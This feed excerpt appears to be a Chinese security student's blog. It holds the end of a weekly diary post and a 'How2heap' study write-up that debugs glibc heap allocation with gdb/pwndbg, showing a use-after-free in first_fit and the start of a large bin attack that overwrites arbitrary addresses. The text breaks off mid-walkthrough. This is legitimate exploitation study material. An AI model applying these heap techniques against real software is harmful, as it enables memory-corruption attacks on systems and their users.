title="剧集"></a>剧集</h2><ol><li>觉醒年代</li></ol><p>吹爆！！！！！陈独秀！！！老于演的真是有感觉！！</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>He who has a why to live can bear almost any how.</li></ol><p>只要心中火焰没有熄灭，哪怕寒风再凛冽，活着也是一件温暖的事情。</p><ol start="2"><li>马克思在《1844 经济学哲学手稿》中对“劳动异化”的阐述已经说明了问题，他认为：劳动即自由自觉的活动，是人类的本质，但在私有制条件下劳动却发生了异化，所以劳动异化即人的本质异化。</li><li>发动态是热爱生活，没有动态的日子我在认真生活。</li><li>甘苦与共，是浮生茶，也是人生路。</li><li>身后万家灯火，身前滂沱大雨。</li><li>生活的洪流让人们窒息，我们在缺氧的环境中肆意生长。</li><li>愿此去前程似锦，再相逢仍似故人。</li></ol><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>堆漏洞挖掘</li><li>指针与引用</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>你现在的努力，辛苦，压力，承受的一切，都是为了攒够能力和本钱，去做自己更喜欢的事，去为自己争取选择的权利。</li><li>让你太累的关系，及时放手没有错</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;时讯&quot;&gt;&lt;a href=&quot;#时讯&quot; class=&quot;headerlink&quot; title=&quot;时讯&quot;&gt;&lt;/a&gt;时讯&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;天舟二号发射成功！&lt;/li&gt;
&lt;li&gt;黑科技的瓜&lt;/li&gt;
&lt;li&gt;三孩政策&lt;/li&gt;
&lt;li&gt;7 号楼偷拍事件&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    <category term="周报" scheme="https://www.blog.hackerjerry.top/categories/%E5%91%A8%E6%8A%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>How2heap系列</title>
    <link href="https://www.blog.hackerjerry.top/2021/How2heap%E7%B3%BB%E5%88%97/"/>
    <id>https://www.blog.hackerjerry.top/2021/How2heap%E7%B3%BB%E5%88%97/</id>
    <published>2021-05-31T03:51:02.000Z</published>
    <updated>2022-02-07T10:05:54.180Z</updated>
    
    <content type="html"><![CDATA[<p>实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行<code>/lib/x86_64-linux-gnu/libc.so.6</code>即可看到版本<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622445587922-c664f9cc-f070-4d9c-a8fe-be7c909b0a53.png#clientId=u347f053a-7aac-4&from=paste&height=121&id=ubcbe185e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=756&originalType=binary%E2%88%B6=1&size=264115&status=done&style=none&taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&width=378" alt="image.png"></p><a id="more"></a><h1 id="安装-pwngdb-pwndbg"><a href="#安装-pwngdb-pwndbg" class="headerlink" title="安装 pwngdb+pwndbg"></a>安装 pwngdb+pwndbg</h1><p>参考<a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a><br>配置如下<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622450689286-242405c0-da07-4c1c-ad77-236b1ad0719a.png#clientId=u347f053a-7aac-4&from=paste&height=181&id=udbe3c4f1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=534&originalType=binary%E2%88%B6=1&size=278719&status=done&style=none&taskId=u86b81336-450f-40db-a685-ef4ce0a2429&width=267" alt="image.png"></p><h1 id="how2heap-概述"><a href="#how2heap-概述" class="headerlink" title="how2heap 概述"></a>how2heap 概述</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469260530-70e29cd8-6fc3-4252-8a81-cb96056c3927.png#clientId=u347f053a-7aac-4&from=paste&height=328&id=u094da593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=656&originWidth=1195&originalType=binary%E2%88%B6=1&size=115449&status=done&style=none&taskId=ua9828c89-666f-4095-af6d-4a8310c5693&width=597.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469273877-6dfd3d64-636b-47a4-ad9d-3f5555b519bb.png#clientId=u347f053a-7aac-4&from=paste&height=357&id=ued1b9be3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1202&originalType=binary%E2%88%B6=1&size=131426&status=done&style=none&taskId=u62e23b01-92b3-4bf2-9bf4-b40d8099d96&width=601" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469300251-c5bf17b9-384d-4f62-afd7-54240544a4aa.png#clientId=u347f053a-7aac-4&from=paste&height=324&id=udf398312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1206&originalType=binary%E2%88%B6=1&size=141433&status=done&style=none&taskId=ueb73bcb6-30ef-4add-ac3a-64f6fa81b36&width=603" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622469311913-91a92533-e0c6-42ea-ae84-6f5e8df5640b.png#clientId=u347f053a-7aac-4&from=paste&height=89&id=uca37f774&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1199&originalType=binary%E2%88%B6=1&size=41410&status=done&style=none&taskId=u510b02f8-c5d4-432b-a698-2fe503733f1&width=599.5" alt="image.png"></p><h1 id="切换-glibc-版本"><a href="#切换-glibc-版本" class="headerlink" title="切换 glibc 版本"></a>切换 glibc 版本</h1><p>不到万不得已，不用<code>apt-get install libc-bin=2.24-11+deb9u1 libc6=2.24-11+deb9u1</code></p><blockquote><p>这个版本是通过</p></blockquote><p>glibc 是动态链接库<br>所以可以指定程序的任意 glibc 版本哦，ubuntu 的 glibc-all-in-one 也可以直接用在 debian 上的！<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622476552690-d31a7737-0123-4d85-95b8-f3817bc2c993.png#clientId=u347f053a-7aac-4&from=paste&height=238&id=u630ec27f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=1052&originalType=binary%E2%88%B6=1&size=450517&status=done&style=none&taskId=u55f4ef69-a967-440a-977e-c93ae10ee37&width=526" alt="image.png"><br>然后参考<br><a href="https://blog.csdn.net/qq_45595732/article/details/115385790">https://blog.csdn.net/qq_45595732/article/details/115385790</a><br><a href="https://www.yuque.com/kaleido76/pwn/fn4432">https://www.yuque.com/kaleido76/pwn/fn4432</a><br><a href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a><br>并运行类似<br><code>patchelf --set-interpreter /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so overlapping1</code></p><p><code>patchelf --set-rpath /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 overlapping1 </code><br>​</p><p>大功告成<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622476736461-1b38c6e4-2550-4dff-a823-5800d51c10a5.png#clientId=u347f053a-7aac-4&from=paste&height=175&id=ud788b965&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1285&originalType=binary%E2%88%B6=1&size=367384&status=done&style=none&taskId=u5b431fbb-b35d-4966-ad37-114dee52ab6&width=642.5" alt="image.png"></p><h1 id="first-fit-2-28"><a href="#first-fit-2-28" class="headerlink" title="first_fit-2.28"></a>first_fit-2.28</h1><p>这里没有任何攻击，说的是 glibc 分配内存的方式是最先适应算法，空闲块按地址递增的顺序排列，只要求分配空间大小小于该空闲空间大小，就可以分配。实例中给了分配两个 chunk，大小分别为 512 和 256，大于 fastbin，然后写入数据并释放第一个 512chunk，释放的 chunk 在 unsorted bin 之中，之后再分配 500 字节。此时由于 glibc 机制，直接在 unsorted bin 中找到并将其分割，一部分给用户，另一部分保留，所以第三个 chunk 指针与之前第一个 chunk 的相同。<br>我们首先编译<code>gcc first_fit.c -o first -g</code><br>然后<code>gdb first</code>进行调试<br>首先，输入 start<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622450724910-c67d6615-227c-4b6f-84fe-004d96a9c21f.png#clientId=u347f053a-7aac-4&from=paste&height=345&id=ud7ff854b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=651&originWidth=1122&originalType=binary%E2%88%B6=1&size=1125083&status=done&style=none&taskId=u865c97c4-9a62-4c88-9ec7-fb5a1836f15&width=595" alt="image.png"><br>然后查看堆内存<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622450734858-091f3c86-b244-4657-857a-0d74f59ceab4.png#clientId=u347f053a-7aac-4&from=paste&height=56&id=ua939020c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=393&originalType=binary%E2%88%B6=1&size=47039&status=done&style=none&taskId=u8d8fb7a1-4131-4495-a082-a96510f4dc6&width=259.5" alt="image.png"><br>可以看到还是没有的<br>然后 n 单步运行过 13 行，再次运行 heap，可以看到<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451433938-1f76f4f9-3dea-4fa5-a6df-f306e7409e70.png#clientId=u347f053a-7aac-4&from=paste&height=439&id=udab41a45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=878&originWidth=1160&originalType=binary%E2%88%B6=1&size=1557884&status=done&style=none&taskId=u232dd3dc-7d9b-4606-9589-d112211794b&width=580" alt="image.png"><br>即第一个 a 的地址就是 0x8005250，然后我们继续分配 b<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451474679-dad746d5-93f4-4eb3-acae-c5f71d628011.png#clientId=u347f053a-7aac-4&from=paste&height=222&id=uf4233992&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=501&originalType=binary%E2%88%B6=1&size=323156&status=done&style=none&taskId=u60f56a96-0f5d-4938-80fd-aa9847763cb&width=250.5" alt="image.png"><br>可以发现 b 的地址是 0x8005770<br>而输出的数据是：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451532576-69ce5439-7a51-4173-b8fb-b1117cbe000b.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=ub33635ce&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=317&originalType=binary%E2%88%B6=1&size=24302&status=done&style=none&taskId=u1e352d62-d807-4c64-9204-cbe87c066c7&width=158.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451544941-7545c484-68bf-4cf3-b827-e82efaf7955f.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=u0a63667d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=321&originalType=binary%E2%88%B6=1&size=26195&status=done&style=none&taskId=u605230af-8d93-4b13-b34e-467e78437e4&width=160.5" alt="image.png"><br>这是因为我们知道 chunk 指针返回的是 mem 数据部分，chunk 在使用时的数据结构如下图：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp">    An allocated chunk looks like <span class="hljs-keyword">this</span>:<br>    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of previous chunk, if unallocated (P clear)  |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of chunk, in bytes                     |A|M|P|<br>      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             User data starts here...                          .<br>    .                                                               .<br>    .             (malloc_usable_size() bytes)                      .<br>    .                                                               |<br>nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             (size of chunk, but used <span class="hljs-keyword">for</span> application data)    |<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>    |             Size of next chunk, in bytes                |A|<span class="hljs-number">0</span>|<span class="hljs-number">1</span>|<br>    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br><br></code></pre></td></tr></table></figure><p>其中 chunk 定义的结构体如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      mchunk_size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>每个字段的具体的解释如下</p><ul><li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li><li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 _ SIZE_SZ 的整数倍。如果申请的内存大小不是 2 _ SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li></ul></li></ul><p>也就是说 malloc 返回的指针就是 chunk 的 fd 指针处，返回内存指针地址-0x10 是 chunk 块的真正头部。<br>这个时候我们可以查看以下两个 chunk 的结构：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451710162-f4347035-8d3d-4e0b-9a50-8e8fb749e46a.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=u603191a2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=558&originalType=binary%E2%88%B6=1&size=61499&status=done&style=none&taskId=u335c52b3-4dab-460d-9193-4dc8dd5009a&width=279" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451733665-082ef39a-f546-42c4-9dd3-8ae40da7e984.png#clientId=u347f053a-7aac-4&from=paste&height=39&id=u3578e819&margin=%5Bobject%20Object%5D&name=image.png&originHeight=78&originWidth=568&originalType=binary%E2%88%B6=1&size=60756&status=done&style=none&taskId=ud82be738-496f-4ff0-8b81-3c5a2fd229c&width=284" alt="image.png"><br>验证了我们的想法</p><blockquote><p>GDB 调试查看 Chunk 内存的时候，在 32 位系统的时候用 w（四字节 32 位），在 64 位系统的时候用 g（八字节 64 位）</p></blockquote><p>这时候我们往 a 的内存里面写入了”this is A!”的数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451794181-163a21cc-95f7-4b83-8bc4-86d853c7b1af.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u2a9dd95c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=951&originalType=binary%E2%88%B6=1&size=779596&status=done&style=none&taskId=u7c309d88-ed9c-4395-af94-51e0ef3120c&width=475.5" alt="image.png"><br>查看指针处数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451892237-78d21890-285a-46db-b78a-d481a1ae8fc6.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=uc43258b2&name=image.png&originHeight=80&originWidth=557&originalType=binary%E2%88%B6=1&size=61038&status=done&style=none&taskId=u36a0855c-611f-4636-8b65-a085361d73f&width=278.5" alt="image.png"><br>写入的数据就是上述字符串的 ASCII 码<br>当我们执行 free(a)释放 a 的内存块后，可以发现 a 先被放入了 unsortedbin 中，且 fd 指针和 bk 指针都指向了 main_arena<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622451986494-0574d6cd-5e6f-4a42-9fe9-6dbaba1f1458.png#clientId=u347f053a-7aac-4&from=paste&height=471&id=uaab4248c&name=image.png&originHeight=941&originWidth=1113&originalType=binary%E2%88%B6=1&size=1596503&status=done&style=none&taskId=u46c0ff91-6ad9-4fbc-b7d0-fe90583f478&width=556.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452017378-c8a73946-f457-4dbf-9937-7d26539c47e7.png#clientId=u347f053a-7aac-4&from=paste&height=225&id=u3f41a094&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=864&originalType=binary%E2%88%B6=1&size=548857&status=done&style=none&taskId=u1a73c58c-a933-4d02-afde-ce7d7e95359&width=432" alt="image.png"><br>执行 c = malloc(0x500)，发现 c 分配到的内存块就是原来 a 分配到的内存块<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452091035-06911094-70f2-42b8-938b-fbddf86fbd8c.png#clientId=u347f053a-7aac-4&from=paste&height=457&id=u07255dc9&name=image.png&originHeight=913&originWidth=954&originalType=binary%E2%88%B6=1&size=1290624&status=done&style=none&taskId=u8044fb4e-a813-4d6d-8367-2d0ae72e4ac&width=477" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452218412-b30b1052-1138-4417-a880-516e7871f6dc.png#clientId=u347f053a-7aac-4&from=paste&height=27&id=u1ec3e24f&name=image.png&originHeight=53&originWidth=341&originalType=binary%E2%88%B6=1&size=30323&status=done&style=none&taskId=u1c7f382b-fb27-4d54-a074-30f5ab0390c&width=170.5" alt="image.png"><br>在 glibc-2.28 中，内存块全部分配，不在中 unsorted bin 保留<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452271852-a54c0318-b76a-4105-9647-35d5ca08f5cc.png#clientId=u347f053a-7aac-4&from=paste&height=229&id=uc4dc40e2&name=image.png&originHeight=458&originWidth=457&originalType=binary%E2%88%B6=1&size=297581&status=done&style=none&taskId=u10848018-20f0-4fd5-9087-0a157da04fb&width=228.5" alt="image.png"><br>然后在写入”This is C!”后查看内存情况<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452403013-31d75fbc-1613-45f9-999f-1944dd41641f.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=uc4014290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=644&originWidth=1129&originalType=binary%E2%88%B6=1&size=1108386&status=done&style=none&taskId=ucf59ceba-350e-4979-b446-a6239d8e756&width=564.5" alt="image.png"><br>可以发现和从之前的 0x41 变成了 0x43，说明从 A 变成了 C，然后继续执行<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622452430970-0e0817d2-dec3-4db2-ba21-fb64206518da.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u83f5467d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=59&originWidth=573&originalType=binary%E2%88%B6=1&size=52360&status=done&style=none&taskId=ue3b48849-bd89-4ac8-85de-3f0052f6e91&width=286.5" alt="image.png"><br>这说明这里其实存在一个漏洞：free 掉之后没有把指针置 0，造成一个 UAF(use after free)漏洞。就是 a 已经 free 掉之后又重新把那块地址分配回来再编辑会把 a 所指向的地址的内容也编辑了(也就是这个时候 a 跟 c 指向的是同一内存地址)。<br>修补：free 掉 a 之后，让 a 再指向 null。</p><h1 id="large-bin-attack-2-23"><a href="#large-bin-attack-2-23" class="headerlink" title="large_bin_attack-2.23"></a>large_bin_attack-2.23</h1><p>程序运行结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622794637876-b762787f-a5ed-4130-8fcb-6e644c097f34.png#clientId=u38185df4-f4d6-4&from=paste&height=409&id=u01dce496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=817&originWidth=1905&originalType=binary%E2%88%B6=1&size=1486851&status=done&style=none&taskId=u795c39c6-fa0c-4eb5-bdbd-b2f34b0802f&width=952.5" alt="image.png"><br>该技术可用于修改任意地址的值，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。<br>首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-6</span><br><span class="hljs-number">0x8006fe0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8006ff0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span> &lt;-- p1<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007440</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007450</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007980</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007990</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p3<br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3+(<span class="hljs-number">0x510</span>/<span class="hljs-number">8</span>)<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007eb0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000020151</span>  &lt;-- top<br><span class="hljs-number">0x8007ec0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ed0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ee0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后依次释放掉 p1 和 p2，这两个 free chunk 将被放入 unsorted bin<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622795730921-15b7d6a6-ca40-44d6-9c8c-f644811645e1.png#clientId=u38185df4-f4d6-4&from=paste&height=426&id=u15aba304&name=image.png&originHeight=852&originWidth=688&originalType=binary%E2%88%B6=1&size=355625&status=done&style=none&taskId=u6ad399c3-0c6c-40b5-b103-1c88c38db82&width=344" alt="image.png"><br>内存布局即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span>  &lt;-- p1 [be freed]<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x0000000008007460</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2 [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>类似这样<img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622799357459-3e0b24c7-1a0a-4b1d-a824-ac169d300988.png#clientId=u38185df4-f4d6-4&from=paste&height=262&id=u8d85b49e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=392&originWidth=906&originalType=binary%E2%88%B6=1&size=50371&status=done&style=none&taskId=u3f890383-beb1-48e0-ac59-759732b834b&width=605" alt="image.png"><br>接下来随便 malloc 一个大小为 0x90 的 chunk，则 p1 被切分为两块，一块作为分配的 chunk 返回，剩下的一块继续留在 unsorted bin.（p1 的作用就在这里，如果没有 p1，那么切分的将是 p2）。<br>要注意的是：切割后 p1 的大小是 0x390 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x510 属于 large bin。<br>p2 则被整理回对应的 large bin 链表中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622796677291-eb02c9ba-051c-474f-a4e2-0c211ae226ca.png#clientId=u38185df4-f4d6-4&from=paste&height=447&id=u84e1fe75&name=image.png&originHeight=893&originWidth=657&originalType=binary%E2%88%B6=1&size=654600&status=done&style=none&taskId=u37f8e899-1229-4164-b4f1-edd1e453ddb&width=328.5" 